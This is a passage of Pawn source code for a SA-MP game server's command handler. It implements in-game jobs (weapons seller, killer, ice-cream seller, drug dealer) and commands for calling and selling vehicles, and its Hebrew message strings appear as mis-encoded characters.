		SendClientMessage(playerid,lightblue," ~~~ :юхы°щ Ё∙ўщэ ~~~");
		SendClientMessage(playerid,pink," .Єь ыь юхы° Ё∙ў ьюых° Ё∙ўщэ ь∙чўЁщэ сючщ° ўсхЄ");
		SendClientMessage(playerid,pink," .Єь ыь юыщ°ф, юхы° фЁ∙ўщэ щщўсь р· ∙ххщ фЁ∙ў фЁюы°");
		SendClientMessage(playerid,pink," .юхы° Ё∙ўщэ ьр щыхь ьюых° Ё∙ўщэ ьЄЎюх рх ьюхы° Ё∙ўщэ рч°");
		SendClientMessage(playerid,pink," .фЁ∙ўщэ фЁюы°щэ, рщЁэ ·ющущщэ");
		SendClientMessage(playerid,yellow," /besweapons :ыущ ьфщх· юхы° Ё∙ўщэ щ∙ ьфўьщу р· фЇўхуф");
		SendClientMessage(playerid,purple," :Їўхух· юхы°щ Ё∙ўщэ");
		SendClientMessage(playerid,yellow," /swbw(1)");
		return 1;
	}
	if(equal(cmd,"/besweapons"))
	{
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сЄсхуф ыь∙фщ·");
		playerinfo[playerid][work] = work_weapons;
		SendClientMessage(playerid,blue," /sweapons :ыЄ· р·ф юхы° Ё∙ўщэ. ьющуЄ Єь юхы°щ фЁ∙ўщэ ф∙·ю∙ сЇўхуф");
		new msg[64];
		format(msg,sizeof(msg)," ** !фчь ьЄсху с·х° юхы° Ё∙ўщэ %s",GetName(playerid));
		SendClientMessageToAll(darkred,msg);
		return 1;
	}
	if(equal(cmd,"/swbw"))
	{
		new string[M_S], weaponid, seller = INVALID_PLAYER_ID;
		for(new i=0;i<MAX_PLAYERS_ && seller == INVALID_PLAYER_ID;i++) if(IsPlayerConnected(i) && playerinfo[i][work] == work_weapons) if(GetDistanceBetweenPlayers(playerid,i) < 8.000000) seller = i;
		if(seller == playerid) return SendClientMessage(playerid,red," .фЇўхуф фцх ю∙ю∙· ьрЁ∙щэ ∙юЄхЁщщЁщэ ьўЁх· ююъ Ё∙ўщэ");
		if(seller == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .рщя ∙хэ юхы° Ё∙ўщэ ў°хс рьщъ");
		if(playerinfo[seller][work] == work_weapons) return SendClientMessage(playerid,red," .ьр Ёщ·я ьюых° Ё∙ўщэ ьюхы° Ё∙ўщэ");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /swbw [weapon number] :Ўх°· ф∙щюх∙");
		weaponid = strval(cmd);
		if(weaponid < 0 || weaponid > sizeof(Ammunation)) return SendClientMessage(playerid,red," .юёЇ° Ё∙ў ∙тхщ");
		if(GetMoney(playerid) < WeaponCost(playerid,weaponid)) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє сыущ ьўЁх· р· фЁ∙ў фцф");
		GiveWeapon(playerid,Ammunation[weaponid][aID],Ammunation[weaponid][aAmmo]);
		GiveMoney(playerid,0-WeaponCost(playerid,weaponid),18);
		GiveMoney(seller,WeaponCost(playerid,weaponid),18);
		format(string,sizeof(string)," .%s ююхы° фЁ∙ўщэ %s °ы∙· р· фЁ∙ў",GetName(seller),Ammunation[weaponid][aName]);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .ўщсь· %d$ юьўхч",WeaponCost(playerid,weaponid));
		SendClientMessage(seller,green,string);
		return 1;
	}
	if(equal(cmd,"/killer"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :°хЎчщэ ~~~");
		SendClientMessage(playerid,pink," .Єь ыь °хЎч ьт°хэ Ёцў, шщ°х° хЎ°х· ью∙ш°ф");
		SendClientMessage(playerid,pink," .Єь ыь ф°щт· ∙чўя, ф°хЎч щщўсь 150$ хЄьщщ· °ю· °хЎч");
		SendClientMessage(playerid,pink," .Єь ыь ф°щт· ∙хш°, ф°хЎч щщўсь 200$ хЄьщщ· ∙·щ °юх·");
		SendClientMessage(playerid,yellow," /bekiller :ыущ ьфщх· °хЎч щ∙ ьфўьщу р· фЇўхуф");
		SendClientMessage(playerid,purple," :Їўхух· °хЎчщэ");
		SendClientMessage(playerid,purple," (сёхт°щщэ °∙хюф °ю· ф°хЎч фу°х∙ф, Ёщ·я ьф∙·ю∙ сЇўхух· сыь °ю· ∙чўя)");
		SendClientMessage(playerid,yellow," /getklevel(1) /getgun(10) /allfreeze(32)");
		return 1;
	}
	if(equal(cmd,"/bekiller"))
	{
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сЄсхуф ыь∙фщ·");
		playerinfo[playerid][work] = work_killer;
		playerinfo[playerid][killerlevel] = 1;
		SendClientMessage(playerid,blue," /killer :ыЄ· р·ф °хЎч. ьющуЄ Єь °хЎчщэ ф∙·ю∙ сЇўхуф");
		new msg[64];
		format(msg,sizeof(msg)," ** !фчь ьЄсху с·х° °хЎч ∙ыщ° %s",GetName(playerid));
		SendClientMessageToAll(grey,msg);
		return 1;
	}
	if(equal(cmd,"/getklevel"))
	{
 		new id, string[M_S];
		if(playerinfo[playerid][work] != work_killer) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· °хЎч");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getklevel [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(playerinfo[id][work] != work_killer) return SendClientMessage(playerid,red," .ф∙чўя фЁсч° ьр °хЎч");
		format(string,sizeof(string)," .фщр %d %s °ю· ф°хЎч ∙ь",playerinfo[id][killerlevel],GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/allfreeze"))
	{
 		new Float:p[3];
		if(playerinfo[playerid][work] != work_killer) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· °хЎч");
		if(playerinfo[playerid][killerlevel] < 32) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· ьЇчх· с°ю· °хЎч 32");
		if(CheckIfCommandUsed(playerid,6)) return 1;
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerInCircle(i,p[0],p[1],10.000000) && i != playerid && playerinfo[i][work] != work_killer && GetPlayerSpecialAction(i) != SPECIAL_ACTION_HANDSUP && !IsPlayerInAnyVehicle(i)) SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
		OnPlayerText(playerid," Freeze all!");
		SendClientMessage(playerid,green," !цхфщ фцуюЁх·ъ ьс°хч");
		return 1;
	}
	if(equal(cmd,"/sicecream"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :юхы°щ тьщуф ~~~");
		SendClientMessage(playerid,pink," .Єь ыь юхы° тьщуф ьёЇў тьщух· хсыъ ь°Їрх· ∙чўЁщэ");
		SendClientMessage(playerid,pink," .Єь ыь юыщ°· тьщуф, юхы° фтьщуф щщўсь р· ёыхэ ючщ° фтьщуф ∙фхр фчьщш");
		SendClientMessage(playerid,pink," .ь∙чўя ∙щщф°хт юхы° тьщуф щщ°ух 250$");
		SendClientMessage(playerid,pink," .юхы°щ тьщуф ьр щыхьщэ ьюых° тьщуф рчу ь∙Ёщ");
		SendClientMessage(playerid,yellow," /besicecream :ыущ ьфщх· юхы° тьщуф щ∙ ьфўьщу р· фЇўхуф");
		SendClientMessage(playerid,purple," :Їўхух· юхы°щ тьщуф");
		SendClientMessage(playerid,yellow," /buyicecream(1) /icecreamcost(1)");
		return 1;
	}
	if(equal(cmd,"/besicecream"))
	{
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сЄсхуф ыь∙фщ·");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 423) return SendClientMessage(playerid,red," .Єьщъ ьфщх· срхшх тьщуф сыущ ьфщх· юхы° тьщуф");
		playerinfo[playerid][work] = work_icecream;
		playerinfo[playerid][icecreamcost] = 1;
		SendClientMessage(playerid,blue," /sicecream :ыЄ· р·ф юхы° тьщуф. ьющуЄ Єь юхы°щ фтьщуф");
		new msg[64];
		format(msg,sizeof(msg)," ** !фчь ьЄсху с·х° юхы° тьщуф %s",GetName(playerid));
		SendClientMessageToAll(lightblue,msg);
		return 1;
	}
	if(equal(cmd,"/buyicecream"))
	{
		new seller = INVALID_PLAYER_ID, Float:h, string[M_S];
		if(playerinfo[playerid][work] == work_icecream) return SendClientMessage(playerid,red," .юхы°щ тьщуф рщЁэ щыхьщэ ьўЁх· тьщуф");
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][work] == work_icecream && i != playerid && GetDistanceBetweenPlayers(playerid,i) < 8.000000)
			{
				seller = i;
				break;
			}
		}
		if(seller == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .рщя ∙хэ юхы° тьщуф ∙ў°хс рьщъ");
		if(GetMoney(playerid) < playerinfo[seller][icecreamcost]) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє");
		GiveMoney(playerid,0-playerinfo[seller][icecreamcost],18);
		GiveMoney(seller,playerinfo[seller][icecreamcost],18);
		GetPlayerHealth(playerid,h);
		if(h < 90.0) SetPlayerHealth(playerid,h+10);
		else SetPlayerHealth(playerid,100);
		SendClientMessage(playerid,green," !ўЁщ· тьщуф");
		format(string,sizeof(string)," .%s ўщсь· %d$ юфьўхч",GetName(playerid),playerinfo[seller][icecreamcost]);
		SendClientMessage(seller,green,string);
		return 1;
	}
	if(equal(cmd,"/icecreamcost"))
	{
		new newcost, string[M_S];
		if(playerinfo[playerid][work] != work_icecream) return SendClientMessage(playerid,red," .Єьщъ ьфщх· юхы° тьщуф сыущ ьф∙·ю∙ сЇўхуф цх");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /icecreamcost [cost] :Ўх°· ф∙щюх∙");
		newcost = strval(cmd);
		if(newcost < 1 || newcost > 100) return SendClientMessage(playerid,red," .ючщ° ∙тхщ");
		playerinfo[playerid][icecreamcost] = newcost;
		format(string,sizeof(string)," .∙щЁщ· р· ючщ° фтьщуф ь %d$",playerinfo[playerid][icecreamcost]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/sdrugs"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :ёхч°щ ёющэ ~~~");
		SendClientMessage(playerid,pink," .Єь ыь ёхч° ёющэ ьф·чюў юфю∙ш°ф хьюых° ёющэ");
		SendClientMessage(playerid,pink," .ёхч° фёющэ щыхь ьўсхЄ р· ючщ° фёющэ");
		SendClientMessage(playerid,yellow," /besdrugs :ыущ ьфщх· ёхч° ёющэ щ∙ ьфўьщу р· фЇўхуф");
		SendClientMessage(playerid,purple," :Їўхух· ёющэ");
		SendClientMessage(playerid,yellow," /buydrugs(1) /usedrugs(1) /drugscost(1)");
		return 1;
	}
	if(equal(cmd,"/besdrugs"))
	{
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сЄсхуф ыь∙фщ·");
		playerinfo[playerid][work] = work_drugs;
		SendClientMessage(playerid,blue," /sdrugs :ыЄ· р·ф ёхч° ёющэ. ьющуЄ Єь ёхч°щ фёющэ ф∙·ю∙ сЇўхуф");
		new msg[64];
		format(msg,sizeof(msg)," ** !фчь ьЄсху с·х° ёхч° ёющэ %s",GetName(playerid));
		SendClientMessageToAll(black,msg);
		return 1;
	}
	if(equal(cmd,"/buydrugs"))
	{
		new seller = INVALID_PLAYER_ID, string[M_S];
		if(playerinfo[playerid][drugs] >= 3) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфчцщў щх·° ю3 ёющэ");
		if(playerinfo[playerid][work] == work_drugs) return SendClientMessage(playerid,red," .ёхч°щ ёющэ рщЁэ щыхьщэ ьўЁх· ёющэ");
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][work] == work_drugs && i != playerid && GetDistanceBetweenPlayers(playerid,i) < 8.000000)
			{
				seller = i;
				break;
			}
		}
		if(seller == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .рщя ∙хэ ёхч° ёющэ ў°хс рьщъ");
		if(GetMoney(playerid) < playerinfo[seller][drugscost]) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє");
		GiveMoney(playerid,0-playerinfo[seller][drugscost],18);
		GiveMoney(seller,playerinfo[seller][drugscost],18);
		playerinfo[playerid][drugs]++;
		SendClientMessage(playerid,green," /usedrugs :ўЁщ· ёющэ! ыущ ьф∙·ю∙");
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Drugs",playerinfo[playerid][drugs]);
		format(string,sizeof(string)," .%s ўщсь· %d$ юфьўхч",GetName(playerid),playerinfo[seller][drugscost]);
		SendClientMessage(seller,green,string);
		return 1;
	}
	if(equal(cmd,"/usedrugs"))
	{
		new Float:p[3];
		if(playerinfo[playerid][drugs] <= 0) return SendClientMessage(playerid,red," .рщя ьъ ёющэ");
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		playerinfo[playerid][drugs]--, playerinfo[playerid][drugsp] = CreatePickupEx(1241,15,p[0],p[1],p[2]);
		SetTimerEx("DestroyPickup2",1000,0,"d",playerinfo[playerid][drugsp]);
		return 1;
	}
	if(equal(cmd,"/drugscost"))
	{
		new cost, string[M_S];
		if(playerinfo[playerid][work] != work_drugs) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ёхч° ёющэ ь∙щюх∙ сЇўхуф цх");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /drugscost [cost] :Ўх°· ф∙щюх∙");
		cost = strval(cmd);
		if(cost < 1 || cost > 100) return SendClientMessage(playerid,red," .ёыхэ ∙тхщ");
		playerinfo[playerid][drugscost] = cost;
		format(string,sizeof(string)," .∙щЁщ· р· ючщ° фёющэ ∙ьъ ь %d$",cost);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/exitwork"))
	{
		if(playerinfo[playerid][work] == work_none) return SendClientMessage(playerid,red," .р·ф ьр ЁюЎр с∙хэ Єсхуф");
		SendClientMessage(playerid,red," .ф·Їш°· юЄсху·ъ");
		playerinfo[playerid][work] = work_none, playerinfo[playerid][coplevel] = 0, playerinfo[playerid][doctorlevel] = 0, playerinfo[playerid][drivecost] = 0, playerinfo[playerid][killerlevel] = 0, playerinfo[playerid][icecreamcost] = 0;
		return 1;
	}
	if(equal(cmd,"/vlist"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		if(GetPlayerCheckpoint(playerid) != cp_vstore || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· °ысщэ ыь∙фщ· ьсщЎхЄ фЇўхуф фцх");
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .сюЎсъ фЁхычщ рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх");
		new string[M_S_D+(M_S_D/2)], s = cpinfo[playerinfo[playerid][cp]][cpstoreid], dialogHeader[32];
		if(vstoreinfo[s][vstore_type] == 3) if(playerinfo[playerid][level] < 19) return SendClientMessage(playerid,red," .Єьщщъ ьфщх· с°юф 19 с∙сщь ьўЁх· °ыс ющхчу");
		format(string,sizeof(string),"Vehicle Name\tVehicle Cost");
		for(new i = 0; i < vstoreinfo[s][vstore_count]; i++) format(string,sizeof(string),"%s\n" @c(yellow) "%s\t" @c(green) "$%d",string,GetVehicleName(vstoreinfo[s][vstore_vehicles][i]),vstoreinfo[s][vstore_costs][i]);
		format(dialogHeader,sizeof(dialogHeader),@c(lightblue) "чЁх· ф%s",cpinfo[playerinfo[playerid][cp]][cpname]);
		ShowPlayerDialog(playerid,dialog_vlist,DIALOG_STYLE_TABLIST_HEADERS,dialogHeader,string,"сч°","ётх°");
		if(vstoreinfo[s][vstore_type] == 3)
		{
			SendClientMessage(playerid,red," !∙щэ ьс");
			SendClientMessage(playerid,red," .счЁх· цх Ёщ·я ьўЁх· °ў °ысщэ ∙щ∙ю∙х ы°ыс ∙ьщ∙щ хющхчу");
			SendClientMessage(playerid,lightpurple," :ющуЄ Єь ф°ысщэ");
			for(new i = 0; i < sizeof(SpecialThirdVehicle); i++)
			{
				format(string,sizeof(string)," %d) %s: %s",i+1,GetVehicleName(SpecialThirdVehicle[i][stvModel]),SpecialThirdVehicle[i][stvName]);
				SendClientMessage(playerid,green,string);
			}
		}
		else if(vstoreinfo[s][vstore_type] == 2)
		{
			SendClientMessage(playerid,red," !∙щэ ьс");
			SendClientMessage(playerid,red," .счЁх· цх Ёщ·я ьўЁх· °ў °ысщэ ∙щ∙ю∙х ы°ыс ∙Ёщ");
		}
		return 1;
	}
	if(equal(cmd,"/callv") || equal(cmd,"/callcar") || equal(cmd,"/telcar"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		if(!playerinfo[playerid][vehicle][0]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙ўЁщ·");
		if(!IsPlayerAbleToCallVehicle(playerid)) return 1;
		new sent = 0;
		if(playerinfo[playerid][fuel] != -1)
		{
			if(GetPlayerCheckpoint(playerid) == cp_vstation && IsPlayerInCheckpoint(playerid))
			{
				if(GetMoney(playerid) < 200) return SendClientMessage(playerid,red," .ыущ ь·уьў р·ф Ў°щъ 200$");
				GiveMoney(playerid,0-200,26);
				SendClientMessage(playerid,green," !∙щт°· р· ф°ыс ∙ьъ + ющьр· уьў");
				playerinfo[playerid][fuel] = GetVehicleFuel(playerinfo[playerid][vehicle][0]);
				PlaySound(playerid,1133);
				sent = 1;
			}
			else if(!playerinfo[playerid][fuel])
			{
				SendClientMessage(playerid,red," .∙щт°· р· ф°ыс ∙ьъ, рсь рщя ьх уьў: ыущ ьюьр, ∙т° рх·х ∙хс с·чЁ· °ыс");
				sent = 1;
			}
		}
		if(!sent) SendClientMessage(playerid,green," .∙щт°· р· ф°ыс ∙ьъ");
		fsetint(fuser(playerid),"VehicleFuel",playerinfo[playerid][fuel]);
		new Float:p[4];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		if(playerinfo[playerid][vehicle][1] != -1) DestroyVehicleEx(playerinfo[playerid][vehicle][1]);
		playerinfo[playerid][vehicle][1] = CreateVehicleEx(playerinfo[playerid][vehicle][0],p[0],p[1],p[2],p[3],playerinfo[playerid][pvcol][0],playerinfo[playerid][pvcol][1],respawntime,0,world_normal);
		vehicleinfo[playerinfo[playerid][vehicle][1]][vfuel] = playerinfo[playerid][fuel];
		SetVehicleNumberPlate(playerinfo[playerid][vehicle][1],NumberPlateName(playerid));
		if(playerinfo[playerid][pvpj] > 0) ChangeVehiclePaintjob(playerinfo[playerid][vehicle][1],playerinfo[playerid][pvpj]);
		vehicleinfo[playerinfo[playerid][vehicle][1]][store] = 1;
		vehicleinfo[playerinfo[playerid][vehicle][1]][vowner] = playerid;
		for(new i = 0; i <= 13; i++) if(playerinfo[playerid][pvmod][i] > 0)
		{
			AddVehicleComponent(playerinfo[playerid][vehicle][1],playerinfo[playerid][pvmod][i],playerid);
			if(!IsComponentidCompatible(GetVehicleModel(GetPlayerVehicleID(playerid)), playerinfo[playerid][pvmod][i])) RemoveVehicleComponent(GetPlayerVehicleID(playerid), playerinfo[playerid][pvmod][i]);
		}
		if(playerinfo[playerid][fuel] != -1) SetVehicleParams(playerinfo[playerid][vehicle][1],.engine = (_:(playerinfo[playerid][fuel] > 0)));
		SetTimerEx("PutInVehicle",500,0,"iii",playerid,playerinfo[playerid][vehicle][1],0);
		return 1;
	}
	if(equal(cmd,"/callv2") || equal(cmd,"/callcar2") || equal(cmd,"/telcar2"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		if(!playerinfo[playerid][vehicle][3]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙Ёщ ∙ўЁщ·");
		if(!IsPlayerAbleToCallVehicle(playerid)) return 1;
		SendClientMessage(playerid,green," .∙щт°· р· ф°ыс ф∙Ёщ ∙ьъ");
		new Float:p[4];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		if(playerinfo[playerid][vehicle][1] != -1) DestroyVehicleEx(playerinfo[playerid][vehicle][1]);
		playerinfo[playerid][vehicle][1] = CreateVehicleEx(playerinfo[playerid][vehicle][3],p[0],p[1],p[2],p[3],playerinfo[playerid][pvcol2][0],playerinfo[playerid][pvcol2][1],respawntime,0,world_normal);
		vehicleinfo[playerinfo[playerid][vehicle][1]][vfuel] = -1;
		SetVehicleNumberPlate(playerinfo[playerid][vehicle][1],NumberPlateName(playerid));
		vehicleinfo[playerinfo[playerid][vehicle][1]][store] = 1;
		vehicleinfo[playerinfo[playerid][vehicle][1]][vowner] = playerid;
		SetTimerEx("PutInVehicle",500,0,"iii",playerid,playerinfo[playerid][vehicle][1],0);
		return 1;
	}
	if(equal(cmd,"/callv3") || equal(cmd,"/callcar3") || equal(cmd,"/telcar3"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		if(!playerinfo[playerid][vehicle][5]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙ьщ∙щ хющхчу ∙ўЁщ·");
		if(!IsPlayerAbleToCallVehicle(playerid)) return 1;
		SendClientMessage(playerid,green," .∙щт°· р· ф°ыс ф∙ьщ∙щ хфющхчу ∙ьъ");
		new Float:p[4];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		if(playerinfo[playerid][vehicle][1] != -1) DestroyVehicleEx(playerinfo[playerid][vehicle][1]);
		playerinfo[playerid][vehicle][1] = CreateVehicleEx(playerinfo[playerid][vehicle][5],p[0],p[1],p[2],p[3],playerinfo[playerid][pvcol2][0],playerinfo[playerid][pvcol2][1],respawntime,0,world_normal);
		vehicleinfo[playerinfo[playerid][vehicle][1]][vfuel] = -1;
		SetVehicleNumberPlate(playerinfo[playerid][vehicle][1],NumberPlateName(playerid));
		vehicleinfo[playerinfo[playerid][vehicle][1]][store] = 1;
		vehicleinfo[playerinfo[playerid][vehicle][1]][vowner] = playerid;
		SetTimerEx("PutInVehicle3",500,0,"iii",playerid,playerinfo[playerid][vehicle][1],0);
		return 1;
	}
	if(equal(cmd,"/hidev") || equal(cmd,"/hidecar"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		if(!playerinfo[playerid][vehicle][0]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙ўЁщ·");
		if(playerinfo[playerid][vehicle][1] == -1) return SendClientMessage(playerid,red," /CallV :ф°ыс ∙ьъ ыс° юхё·°, ыущ ь∙т° рх·х");
		if(playerinfo[playerid][vtele3] == 1) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфё·щ° °ыс ющхчу");
		DestroyVehicleEx(playerinfo[playerid][vehicle][1]);
		playerinfo[playerid][vehicle][1] = -1;
		SendClientMessage(playerid,green," .фё·°· р· ф°ыс ∙ьъ");
		return 1;
	}
	if(equal(cmd,"/sellv") || equal(cmd,"/sellcar"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		if(!playerinfo[playerid][vehicle][0]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙ўЁщ·");
		if(auction[0] == playerid || sellvadv[0] == playerid) return SendClientMessage(playerid, red, " .рщЁъ щыхь ьюых° р· °ысъ ь∙°· ы∙р·ф юсЎЄ юыщ°ф Їхюсщ· Єьщх");
		new string[M_S], m = fgetint(fuser(playerid),"VehicleCost")/2, v = playerinfo[playerid][vehicle][0];
		if(playerinfo[playerid][vehicle][1] != -1) if(vehicleinfo[playerinfo[playerid][vehicle][1]][vemodel] == v)
		{
			DestroyVehicleEx(playerinfo[playerid][vehicle][1]);
			playerinfo[playerid][vehicle][1] = -1;
		}
		playerinfo[playerid][vehicle][0] = 0, playerinfo[playerid][vehicle][2] = 0;
		playerinfo[playerid][pvcol] = {-1,-1}, playerinfo[playerid][pvpj] = 0;
		playerinfo[playerid][fuel] = -1;
		fsetint(fuser(playerid),"PVehicle",0);
		fsetint(fuser(playerid),"VehicleCost",0);
		if(fkeyexist(fuser(playerid),"VehicleColor1")) fremovekey(fuser(playerid),"VehicleColor1");
		if(fkeyexist(fuser(playerid),"VehicleColor2")) fremovekey(fuser(playerid),"VehicleColor2");
		if(fkeyexist(fuser(playerid),"VehiclePJ")) fremovekey(fuser(playerid),"VehiclePJ");
		if(fkeyexist(fuser(playerid),"VehicleFuel")) fremovekey(fuser(playerid),"VehicleFuel");
		for(new i = 0; i <= 13; i++)
		{
			playerinfo[playerid][pvmod][i] = 0;
			format(string,sizeof(string),"VehicleMod%d",i);
			if(fkeyexist(fuser(playerid),string)) fremovekey(fuser(playerid),string);
		}
		new total = 0;
		for(new i = 0; i <= 13; i++)
		{
			if(playerinfo[playerid][pvmod][i] > 0)
			{
				playerinfo[playerid][pvmod][i] = 0;
				format(string,sizeof(string),"VehicleMod%d",i);
				if(fkeyexist(fuser(playerid),string)) fremovekey(fuser(playerid),string);
				total++;
			}
			if(GetVehicleComponentInSlot(v,i) >= 1000) RemoveVehicleComponent(v,GetVehicleComponentInSlot(v,i));
		}
		GiveMoney(playerid,m,27);
		format(string,sizeof(string)," .∙ьъ, ф°ххч· %d$ %s-юы°· р· ф",m,GetVehicleName(v));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/sellv2") || equal(cmd,"/sellcar2"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		if(!playerinfo[playerid][vehicle][3]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙Ёщ ∙ўЁщ·");
		new string[M_S], m = fgetint(fuser(playerid),"Vehicle2Cost")/2, v = playerinfo[playerid][vehicle][3];
		if(playerinfo[playerid][vehicle][1] != -1) if(vehicleinfo[playerinfo[playerid][vehicle][1]][vemodel] == v)
		{
			DestroyVehicleEx(playerinfo[playerid][vehicle][1]);
			playerinfo[playerid][vehicle][1] = -1;
		}
		playerinfo[playerid][vehicle][3] = 0, playerinfo[playerid][vehicle][4] = 0;
		playerinfo[playerid][pvcol2] = {-1,-1};
		fsetint(fuser(playerid),"PVehicle2",0);
		fsetint(fuser(playerid),"Vehicle2Cost",0);
		if(fkeyexist(fuser(playerid),"Vehicle2Color1")) fremovekey(fuser(playerid),"Vehicle2Color1");
		if(fkeyexist(fuser(playerid),"Vehicle2Color2")) fremovekey(fuser(playerid),"Vehicle2Color2");
		GiveMoney(playerid,m,27);
		format(string,sizeof(string)," .∙ьъ, ф°ххч· %d$ %s-юы°· р· ф",m,GetVehicleName(v));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/sellv3") || equal(cmd,"/sellcar3"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		if(!playerinfo[playerid][vehicle][5]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙ьщ∙щ хющхчу ∙ўЁщ·");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщщъ ьфщх· с°ыс фющхчу ∙ьъ с∙сщь ∙·хыь ьюых° рх·х");
		if(IsPlayerInAnyVehicle(playerid)) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		new string[M_S], m = fgetint(fuser(playerid),"Vehicle3Cost")/2, v = playerinfo[playerid][vehicle][5];
		if(playerinfo[playerid][vehicle][1] != -1) if(vehicleinfo[playerinfo[playerid][vehicle][1]][vemodel] == v)
		{
			DestroyVehicleEx(playerinfo[playerid][vehicle][1]);
			playerinfo[playerid][vehicle][1] = -1;
		}
		playerinfo[playerid][vehicle][5] = 0, playerinfo[playerid][vehicle][6] = 0;
		playerinfo[playerid][pvcol2] = {-1,-1};
		fsetint(fuser(playerid),"PVehicle3",0);
		fsetint(fuser(playerid),"Vehicle3Cost",0);
		if(fkeyexist(fuser(playerid),"Vehicle3Color1")) fremovekey(fuser(playerid),"Vehicle3Color1");
		if(fkeyexist(fuser(playerid),"Vehicle3Color2")) fremovekey(fuser(playerid),"Vehicle3Color2");
		GiveMoney(playerid,m,27);
		format(string,sizeof(string)," .фющхчу ∙ьъ, ф°ххч· %d$ %s-юы°· р· ф",m,GetVehicleName(v));
		SendClientMessage(playerid,green,string);
		if(playerinfo[playerid][vtele3] == 1) DestroyObject(playerinfo[playerid][vehicle][7]),playerinfo[playerid][vtele3] = 0;
		return 1;
	}
	if(equal(cmd,"/vmod"))
	{
		new string[M_S], v = GetPlayerVehicleID(playerid);
